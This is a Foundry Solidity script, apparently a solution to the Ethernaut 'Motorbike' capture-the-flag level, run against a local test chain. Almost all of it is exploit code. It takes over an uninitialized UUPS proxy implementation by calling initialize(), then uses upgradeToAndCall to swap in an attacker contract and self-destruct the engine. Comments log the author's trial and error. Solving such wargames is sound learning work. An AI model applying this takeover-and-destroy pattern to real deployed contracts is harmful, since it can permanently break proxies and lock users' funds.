// // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Motorbike.sol";
import "../src/MotorbikeHack.sol";

// We are upgrader
// $forge script script/MotorbikeHack.s.sol --rpc-url http://localhost:8545 --broadcast -vvvv
//  $cast call 0xBA695e8f7997E21a4884A41937711b6D371C9585 "upgrader()"
// cast storage 0xBA695e8f7997E21a4884A41937711b6D371C9585 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
// Our new contract is implementation on 0xBA695e8f7997E21a4884A41937711b6D371C9585
contract MotorbikeHackScript is Script {
  // Motorbike public motorbikeContract = Motorbike(payable(address(0xBA695e8f7997E21a4884A41937711b6D371C9585)));
  Motorbike public motorbikeContract = Motorbike(payable(address(0x4fC343CF521cE30506550252Cc47616EEFB7799b)));
  Engine public engineContract = Engine(payable(address(0xBA695e8f7997E21a4884A41937711b6D371C9585)));
  MotorbikeHack public motorbikeHackContract;
 
  function setUp() public {}

  function run() public {
    uint256 attacker = vm.envUint("PRIVATE_KEY");
    address attackerAddress = 0x359bfB5160946a55f03c080c2DC6975C8F970d5C;
    vm.startBroadcast(attacker);

    engineContract.initialize();
    motorbikeHackContract = new MotorbikeHack();


    // Seems liek we get somewhere here bring the upgrader, then pointing our contract to it, 
    (bool sentSecond,) = address(motorbikeHackContract).call(abi.encodeWithSelector(Engine.initialize.selector, ""));
    // Just had these in wrong order, initialize above, then call destroy in the updgradeToAndCall call and we desroy the engine!
    (bool sent,) = address(engineContract).call(abi.encodeWithSelector(Engine.upgradeToAndCall.selector, address(motorbikeHackContract), abi.encodeWithSelector(MotorbikeHack.destroy.selector, 0x359bfB5160946a55f03c080c2DC6975C8F970d5C)));

  }
}